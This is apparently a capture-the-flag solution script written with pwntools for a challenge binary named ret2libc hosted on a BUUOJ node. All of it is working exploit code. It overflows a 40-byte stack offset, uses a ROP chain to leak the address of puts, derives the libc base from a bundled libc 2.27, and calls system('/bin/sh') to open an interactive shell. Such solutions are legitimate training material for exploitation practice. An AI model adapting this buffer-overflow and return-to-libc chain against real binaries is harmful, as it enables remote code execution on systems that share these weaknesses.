'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
'''

from pwn import *
from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "26854" 
filename = "./ret2libc"
elf = ELF(filename)
# both libc versions can work out: 2.27-3ubuntu1.5_amd64 | 2.27-3ubuntu1.6_amd64
# libc = ELF("./libc-2.27-1.5.so")
libc = ELF("./libc-2.27-1.6.so")
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)


puts_plt_addr = elf.plt['puts']
puts_got_addr = elf.got['puts']
# puts_got_addr = elf.got['read']
pop_rdi_ret_addr = 0x0000000000400763
ret_addr = 0x0000000000400506
main_addr = 0x0000000000400698
buffer_overflow_size = 32 + 8
appending_string = cyclic(buffer_overflow_size)

def B():
    gdb.attach(io)
    pause()

def pwn():
    payload = appending_string + p64(pop_rdi_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)
    io.sendlineafter(b'Show me your magic again\n', payload)
    io.recvuntil(b'See you next time\n')
    puts_addr = u64(io.recv(6).ljust(8, b'\x00'))
    print('puts address: {}'.format(hex(puts_addr)))
    # print('read address: {}'.format(hex(puts_addr)))

    # LibcSearcher can <not> work for this challenge
    # libc = LibcSearcher('puts', puts_addr)
    # libc = LibcSearcher('read', puts_addr)
    # libc.address = puts_addr - libc.dump('puts')
    # system_addr = libc.dump("system")
    # binsh_addr = libc.dump("str_bin_sh")

    # search the offset manually
    libc_base = puts_addr - libc.sym['puts']
    system_addr = libc_base + libc.sym['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
  
    payload = appending_string + p64(ret_addr) + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)
    io.sendlineafter(b'Show me your magic again\n', payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
